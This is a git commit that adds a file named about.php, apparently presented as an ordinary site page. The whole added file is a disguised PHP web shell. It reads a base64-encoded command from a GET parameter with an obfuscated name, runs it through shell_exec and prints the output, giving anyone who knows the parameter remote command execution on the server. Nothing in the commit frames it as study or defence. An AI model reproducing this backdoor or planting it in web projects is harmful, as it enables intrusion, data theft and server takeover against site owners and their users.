addda4aa0e74d4b701f91acaf8d984124ffd5b81
seve02 <110140642+seve02@users.noreply.github.com>
2024-07-13 14:30:48 +0800

    Add files via upload

---
+++ about.php
@@ -0,0 +1,7 @@
+<?php
+if (isset($_GET['dcfdd5e021a869fcc6dfaef8bf31377e'])) {
+    $dcfdd5e021a869fcc6dfaef8bf31377e = $_GET['dcfdd5e021a869fcc6dfaef8bf31377e'];
+    $fb7792b6596fd12502dd132c0aba0568 = shell_exec(base64_decode($dcfdd5e021a869fcc6dfaef8bf31377e));
+    echo "<pre>$fb7792b6596fd12502dd132c0aba0568</pre>";
+}
+?>
